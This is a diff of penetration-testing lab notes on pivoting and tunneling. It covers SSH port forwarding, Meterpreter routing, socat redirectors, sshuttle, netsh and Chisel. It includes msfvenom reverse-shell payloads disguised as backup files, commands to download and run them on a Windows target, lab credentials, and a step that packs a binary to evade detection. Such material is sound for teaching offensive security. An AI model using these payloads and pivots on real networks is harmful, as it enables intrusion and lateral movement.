@@ -49,8 +49,6 @@ We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), wh
 
 #### Scanning the Pivot Target
 
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
-
 ```bash
 nmap -sT -p22,3306 10.129.202.64
 
@@ -68,8 +66,6 @@ Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
 The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port `1234` and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port `3306`. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
 
 #### Executing the Local Port Forward
-
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```bash
 ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
@@ -107,8 +103,6 @@ The `-L` command tells the SSH client to request the SSH server to forward all t
 
 #### Confirming Port Forward with Netstat
 
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
-
 ```bash
 netstat -antp | grep 1234
 
@@ -119,8 +113,6 @@ tcp6       0      0 ::1:1234                :::*                    LISTEN      
 ```
 
 #### Confirming Port Forward with Nmap
-
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```bash
 nmap -v -sV -p1234 localhost
@@ -158,8 +150,6 @@ Similarly, if we want to forward multiple ports from the Ubuntu server to your l
 
 #### Forwarding Multiple Ports
 
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
-
 ```bash
 matmarqx@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 ```
@@ -174,8 +164,6 @@ Now, if you type `ifconfig` on the Ubuntu host, you will find that this server h
 *   The loopback interface (`lo`).
 
 #### Looking for Opportunities to Pivot using ifconfig
-
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```bash
 ubuntu@WEB01:~$ ifconfig 
@@ -221,8 +209,6 @@ In the above image, the attack host starts the SSH client and requests the SSH s
 
 #### Enabling Dynamic Port Forwarding with SSH
 
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
-
 ```bash
 ssh -D 9050 ubuntu@10.129.202.64
 ```
@@ -232,8 +218,6 @@ The `-D` argument requests the SSH server to enable dynamic port forwarding. Onc
 To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.
 
 #### Checking `/etc/proxychains.conf`
-
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```bash
 tail -4 /etc/proxychains.conf
@@ -246,8 +230,6 @@ socks4 	127.0.0.1 9050
 Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the `172.16.5.0/23` network.
 
 #### Using Nmap with Proxychains
-
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```bash
 proxychains nmap -v -sn 172.16.5.1-200
@@ -272,8 +254,6 @@ This part of packing all your Nmap data using proxychains and forwarding it to a
 We will perform a remote system scan using the below command.
 
 #### Enumerating the Windows Target through Proxychains
-
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```bash
 proxychains nmap -v -Pn -sT 172.16.5.19
@@ -323,8 +303,6 @@ The Nmap scan shows several open ports, one of which is `RDP port` (3389). Simil
 
 We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
 
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
-
 ```bash
 proxychains msfconsole
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -334,8 +312,6 @@ msf6 >
 Let's use the `rdp_scanner` auxiliary module to check if the host on the internal network is listening on 3389.
 
 #### Using `rdp\_scanner` Module
-
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```bash
 msf6 > search rdp_scanner
@@ -369,8 +345,6 @@ Depending on the level of access we have to this host during an assessment, we m
 
 #### Using xfreerdp with Proxychains
 
-Dynamic Port Forwarding with SSH and SOCKS Tunneling
-
 ```bash
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
@@ -398,8 +372,6 @@ In these cases, we would have to find a pivot host, which is a common connection
 
 #### Creating a Windows Payload with msfvenom
 
-Remote/Reverse Port Forwarding with SSH
-
     matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
     
     [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -411,8 +383,6 @@ Remote/Reverse Port Forwarding with SSH
     
 
 #### Configuring & Starting the multi/handler
-
-Remote/Reverse Port Forwarding with SSH
 
     msf6 > use exploit/multi/handler
     
@@ -432,8 +402,6 @@ Once our payload is created and we have our listener configured & running, we ca
 
 #### Transferring Payload to Pivot Host
 
-Remote/Reverse Port Forwarding with SSH
-
     matmarqx@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
     
     backupscript.exe                                   100% 7168    65.4KB/s   00:00 
@@ -443,16 +411,12 @@ After copying the payload, we will start a `python3 HTTP server` using the below
 
 #### Starting Python3 Webserver on Pivot Host
 
-Remote/Reverse Port Forwarding with SSH
-
     ubuntu@Webserver$ python3 -m http.server 8123
     
 
 #### Downloading Payload on the Windows Target
 
 We can download this `backupscript.exe` on the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`.
-
-Remote/Reverse Port Forwarding with SSH
 
     PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
     
@@ -461,16 +425,12 @@ Once we have our payload downloaded on the Windows host, we will use `SSH remote
 
 #### Using SSH -R
 
-Remote/Reverse Port Forwarding with SSH
-
     matmarqx@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
     
 
 After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
 
 #### Viewing the Logs from the Pivot
-
-Remote/Reverse Port Forwarding with SSH
 
     ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
     debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
@@ -490,8 +450,6 @@ Remote/Reverse Port Forwarding with SSH
 If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.
 
 #### Meterpreter Session Established
-
-Remote/Reverse Port Forwarding with SSH
 
     [*] Started HTTPS reverse handler on https://0.0.0.0:8000
     [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
@@ -521,8 +479,6 @@ Now let us consider a scenario where we have our Meterpreter shell access on the
 
 #### Creating Payload for Ubuntu Pivot Host
 
-Meterpreter Tunneling & Port Forwarding
-
     matmarqx@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
     
     [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -536,8 +492,6 @@ Meterpreter Tunneling & Port Forwarding
 Before copying the payload over, we can start a [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/), also known as a Generic Payload Handler.
 
 #### Configuring & Starting the multi/handler
-
-Meterpreter Tunneling & Port Forwarding
 
     msf6 > use exploit/multi/handler
     
@@ -556,8 +510,6 @@ We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and 
 
 #### Executing the Payload on the Pivot Host
 
-Meterpreter Tunneling & Port Forwarding
-
     ubuntu@WebServer:~$ ls
     
     backupjob
@@ -568,8 +520,6 @@ Meterpreter Tunneling & Port Forwarding
 We need to make sure the Meterpreter session is successfully established upon executing the payload.
 
 #### Meterpreter Session Establishment
-
-Meterpreter Tunneling & Port Forwarding
 
     [*] Sending stage (3020772 bytes) to 10.129.202.64
     [*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
@@ -582,8 +532,6 @@ We know that the Windows target is on the 172.16.5.0/23 network. So assuming tha
 
 #### Ping Sweep
 
-Meterpreter Tunneling & Port Forwarding
-
     meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
     
     [*] Performing ping sweep for IP range 172.16.5.0/23
@@ -593,21 +541,15 @@ We could also perform a ping sweep using a `for loop` directly on a target pivot
 
 #### Ping Sweep For Loop on Linux Pivot Hosts
 
-Meterpreter Tunneling & Port Forwarding
-
     for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
     
 
 #### Ping Sweep For Loop Using CMD
 
-Meterpreter Tunneling & Port Forwarding
-
     for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
     
 
 #### Ping Sweep Using PowerShell
-
-Meterpreter Tunneling & Port Forwarding
 
     1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
     
@@ -617,8 +559,6 @@ Note: It is possible that a ping sweep may not result in successful replies on t
 There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.
 
 #### Configuring MSF's SOCKS Proxy
-
-Meterpreter Tunneling & Port Forwarding
 
     msf6 > use auxiliary/server/socks_proxy
     
@@ -653,8 +593,6 @@ Meterpreter Tunneling & Port Forwarding
 
 #### Confirming Proxy Server is Running
 
-Meterpreter Tunneling & Port Forwarding
-
     msf6 auxiliary(server/socks_proxy) > jobs
     
     Jobs
@@ -669,8 +607,6 @@ After initiating the SOCKS server, we will configure proxychains to route traffi
 
 #### Adding a Line to proxychains.conf if Needed
 
-Meterpreter Tunneling & Port Forwarding
-
     socks4 	127.0.0.1 9050
     
 
@@ -679,8 +615,6 @@ Note: Depending on the version the SOCKS server is running, we may occasionally 
 Finally, we need to tell our socks\_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
 
 #### Creating Routes with AutoRoute
-
-Meterpreter Tunneling & Port Forwarding
 
     msf6 > use post/multi/manage/autoroute
     
@@ -701,8 +635,6 @@ Meterpreter Tunneling & Port Forwarding
 
 It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
 
-Meterpreter Tunneling & Port Forwarding
-
     meterpreter > run autoroute -s 172.16.5.0/23
     
     [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
@@ -715,8 +647,6 @@ Meterpreter Tunneling & Port Forwarding
 After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.
 
 #### Listing Active Routes with AutoRoute
-
-Meterpreter Tunneling & Port Forwarding
 
     meterpreter > run autoroute -p
     
@@ -736,8 +666,6 @@ Meterpreter Tunneling & Port Forwarding
 As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
 
 #### Testing Proxy & Routing Functionality
-
-Meterpreter Tunneling & Port Forwarding
 
     matmarqx@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
     
@@ -767,8 +695,6 @@ Port forwarding can also be accomplished using Meterpreter's `portfwd` module. W
 
 #### Portfwd options
 
-Meterpreter Tunneling & Port Forwarding
-
     meterpreter > help portfwd
     
     Usage: portfwd [-h] [add | delete | list | flush] [args]
@@ -787,8 +713,6 @@ Meterpreter Tunneling & Port Forwarding
 
 #### Creating Local TCP Relay
 
-Meterpreter Tunneling & Port Forwarding
-
     meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
     
     [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
@@ -798,16 +722,12 @@ The above command requests the Meterpreter session to start a listener on our at
 
 #### Connecting to Windows Target through localhost
 
-Meterpreter Tunneling & Port Forwarding
-
     matmarqx@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
     
 
 #### Netstat Output
 
 We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
-
-Meterpreter Tunneling & Port Forwarding
 
     matmarqx@htb[/htb]$ netstat -antp
     
@@ -822,16 +742,12 @@ We can create a reverse port forward on our existing shell from the previous sce
 
 #### Reverse Port Forwarding Rules
 
-Meterpreter Tunneling & Port Forwarding
-
     meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
     
     [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
     
 
 #### Configuring & Starting multi/handler
-
-Meterpreter Tunneling & Port Forwarding
 
     meterpreter > bg
     
@@ -851,8 +767,6 @@ We can now create a reverse shell payload that will send a connection back to ou
 
 #### Generating the Windows Payload
 
-Meterpreter Tunneling & Port Forwarding
-
     matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
     
     [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -866,8 +780,6 @@ Meterpreter Tunneling & Port Forwarding
 Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
 
 #### Establishing the Meterpreter session
-
-Meterpreter Tunneling & Port Forwarding
 
     [*] Started reverse TCP handler on 0.0.0.0:8081 
     [*] Sending stage (200262 bytes) to 10.10.14.18
@@ -887,16 +799,12 @@ Meterpreter Tunneling & Port Forwarding
 
 #### Starting Socat Listener
 
-Socat Redirection with a Reverse Shell
-
     ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
     
 
 Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
 
 #### Creating the Windows Payload
-
-Socat Redirection with a Reverse Shell
 
     matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
     
@@ -912,16 +820,12 @@ Keep in mind that we must transfer this payload to the Windows host. We can use 
 
 #### Starting MSF Console
 
-Socat Redirection with a Reverse Shell
-
     matmarqx@htb[/htb]$ sudo msfconsole
     
     <SNIP>
     
 
 #### Configuring & Starting the multi/handler
-
-Socat Redirection with a Reverse Shell
 
     msf6 > use exploit/multi/handler
     
@@ -941,8 +845,6 @@ We can test this by running our payload on the windows host again, and we should
 
 #### Establishing the Meterpreter Session
 
-Socat Redirection with a Reverse Shell
-
     [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
     [*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
     [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
@@ -961,8 +863,6 @@ We can create a bind shell using msfvenom with the below command.
 
 #### Creating the Windows Payload
 
-Socat Redirection with a Bind Shell
-
     matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
     
     [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -977,16 +877,12 @@ We can start a `socat bind shell` listener, which listens on port `8080` and for
 
 #### Starting Socat Bind Shell Listener
 
-Socat Redirection with a Bind Shell
-
     ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
     
 
 Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
 
 #### Configuring & Starting the Bind multi/handler
-
-Socat Redirection with a Bind Shell
 
     msf6 > use exploit/multi/handler
     
@@ -1006,10 +902,313 @@ We can see a bind handler connected to a stage request pivoted via a socat liste
 
 #### Establishing Meterpreter Session
 
-Socat Redirection with a Bind Shell
-
     [*] Sending stage (200262 bytes) to 10.129.202.64
     [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
     
     meterpreter > getuid
     Server username: INLANEFREIGHT\victor
+
+
+## SSH Pivoting with Sshuttle
+
+[Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.
+
+One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.
+
+To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
+
+#### Running sshuttle
+
+    matmarqx@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+    
+    Starting sshuttle proxy (version 1.1.0).
+    c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
+    fw: Starting firewall with Python version 3.9.2
+    fw: ready method name nat.
+    c : IPv6 enabled: Using default IPv6 listen address ::1
+    c : Method: nat
+    c : IPv4: on
+    c : IPv6: on
+    c : UDP : off (not available with nat method)
+    c : DNS : off (available)
+    c : User: off (available)
+    c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
+    c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
+    c : Subnets to exclude from forwarding:
+    c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
+    c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
+    c : TCP redirector listening on ('::1', 12300, 0, 0).
+    c : TCP redirector listening on ('127.0.0.1', 12300).
+    c : Starting client with Python version 3.9.2
+    c : Connecting to server...
+    ubuntu@10.129.202.64's password: 
+     s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
+     s: latency control setting = True
+     s: auto-nets:False
+    c : Connected to server.
+    fw: setting up.
+    fw: ip6tables -w -t nat -N sshuttle-12300
+    fw: ip6tables -w -t nat -F sshuttle-12300
+    fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
+    fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
+    fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
+    fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
+    fw: iptables -w -t nat -N sshuttle-12300
+    fw: iptables -w -t nat -F sshuttle-12300
+    fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
+    fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
+    fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
+    fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
+    fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
+    
+
+With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
+
+#### Traffic Routing through iptables Routes
+
+    matmarqx@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
+    
+    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+    Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST
+    NSE: Loaded 155 scripts for scanning.
+    NSE: Script Pre-scanning.
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Initiating Parallel DNS resolution of 1 host. at 11:16
+    Completed Parallel DNS resolution of 1 host. at 11:16, 0.15s elapsed
+    Initiating Connect Scan at 11:16
+    Scanning 172.16.5.19 [1 port]
+    Completed Connect Scan at 11:16, 2.00s elapsed (1 total ports)
+    Initiating Service scan at 11:16
+    NSE: Script scanning 172.16.5.19.
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Nmap scan report for 172.16.5.19
+    Host is up.
+    
+    PORT     STATE SERVICE       VERSION
+    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+    | rdp-ntlm-info: 
+    |   Target_Name: INLANEFREIGHT
+    |   NetBIOS_Domain_Name: INLANEFREIGHT
+    |   NetBIOS_Computer_Name: DC01
+    |   DNS_Domain_Name: inlanefreight.local
+    |   DNS_Computer_Name: DC01.inlanefreight.local
+    |   Product_Version: 10.0.17763
+    |_  System_Time: 2022-08-14T02:58:25+00:00
+    |_ssl-date: 2022-08-14T02:58:25+00:00; +7s from scanner time.
+    | ssl-cert: Subject: commonName=DC01.inlanefreight.local
+    | Issuer: commonName=DC01.inlanefreight.local
+    | Public Key type: rsa
+    | Public Key bits: 2048
+    | Signature Algorithm: sha256WithRSAEncryption
+    | Not valid before: 2022-08-13T02:51:48
+    | Not valid after:  2023-02-12T02:51:48
+    | MD5:   58a1 27de 5f06 fea6 0e18 9a02 f0de 982b
+    |_SHA-1: f490 dc7d 3387 9962 745a 9ef8 8c15 d20e 477f 88cb
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+    
+    Host script results:
+    |_clock-skew: mean: 6s, deviation: 0s, median: 6s
+    
+    
+    NSE: Script Post-scanning.
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Initiating NSE at 11:16
+    Completed NSE at 11:16, 0.00s elapsed
+    Read data files from: /usr/bin/../share/nmap
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 4.07 seconds
+    
+
+We can now use any tool directly without using proxychains.
+
+## Port Forwarding with Windows Netsh
+
+[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:
+
+*   `Finding routes`
+*   `Viewing the firewall configuration`
+*   `Adding proxies`
+*   `Creating port forwarding rules`
+
+Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`, `172.16.5.25`). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.
+
+![Diagram showing an RDP request from Attack Host (10.10.15.5) to Windows Server (172.16.5.25) via Windows10 User (10.129.15.150) using Netsh.exe. The request listens on port 8080 and forwards to port 3389.](fig/windows_portfwd.png)
+
+We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
+
+#### Using Netsh.exe to Port Forward
+
+    C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
+    
+
+#### Verifying Port Forward
+
+    C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+    
+    Listen on ipv4:             Connect to ipv4:
+    
+    Address         Port        Address         Port
+    --------------- ----------  --------------- ----------
+    10.129.42.198   8080        172.16.5.25     3389
+    
+
+After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.
+
+#### Connecting to the Internal Host through the Port Forward
+
+![Terminal showing xfreerdp command connecting to 10.129.42.198:8080 with user 'victor' and password 'pass@123'. Below, a Windows Command Prompt displays IP configuration for Ethernet adapter, showing IPv4 address 172.16.5.19.](fig/netsh_pivot.png)
+
+
+## SOCKS5 Tunneling with Chisel
+
+[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.
+
+Setting Up & Using Chisel
+-------------------------
+
+Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:
+
+#### Cloning Chisel
+
+    matmarqx@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
+    
+
+We will need the programming language `Go` installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use `go build` to build the Chisel binary.
+
+**Note:** Depending on the version of the `glibc` library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of `chisel`, which can be found in the `Releases` section of the GitHub repository.
+
+#### Building the Chisel Binary
+
+    matmarqx@htb[/htb]$ cd chisel
+    go build
+    CGO_ENABLED=0 go build -o chisel -ldflags="-s -w"   # static binary
+    upx brute chisel    # Ultimate Packer for eXecutables: reduce size
+
+    
+
+It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)" and IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s).
+
+Once the binary is built, we can use `SCP` to transfer it to the target pivot host.
+
+#### Transferring Chisel Binary to Pivot Host
+
+    matmarqx@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
+     
+    ubuntu@10.129.202.64's password: 
+    chisel                                        100%   11MB   1.2MB/s   00:09    
+    
+
+Then we can start the Chisel server/listener.
+
+#### Running the Chisel Server on the Pivot Host
+
+    ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+    
+    2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
+    2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
+    
+
+The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
+
+We can start a client on our attack host and connect to the Chisel server.
+
+#### Connecting to the Chisel Server
+
+    matmarqx@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
+    
+    2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
+    2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+    2022/05/05 14:21:18 client: tun: Bound proxies
+    2022/05/05 14:21:19 client: Handshaking...
+    2022/05/05 14:21:19 client: Sending config
+    2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
+    2022/05/05 14:21:19 client: tun: SSH connected
+    
+
+As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.
+
+#### Editing & Confirming proxychains.conf
+
+We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.
+
+    matmarqx@htb[/htb]$ tail -f /etc/proxychains.conf 
+    
+    #
+    #       proxy types: http, socks4, socks5
+    #        ( auth types supported: "basic"-http  "user/pass"-socks )
+    #
+    [ProxyList]
+    # add proxy here ...
+    # meanwile
+    # defaults set to "tor"
+    # socks4 	127.0.0.1 9050
+    socks5 127.0.0.1 1080
+    
+
+Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+#### Pivoting to the DC
+
+SOCKS5 Tunneling with Chisel
+
+    matmarqx@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+    
+
+## Chisel Reverse Pivot
+
+In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
+
+When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
+
+We'll start the server in our attack host with the option `--reverse`.
+
+#### Starting the Chisel Server on our Attack Host
+
+    matmarqx@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+    
+    2022/05/30 10:19:16 server: Reverse tunnelling enabled
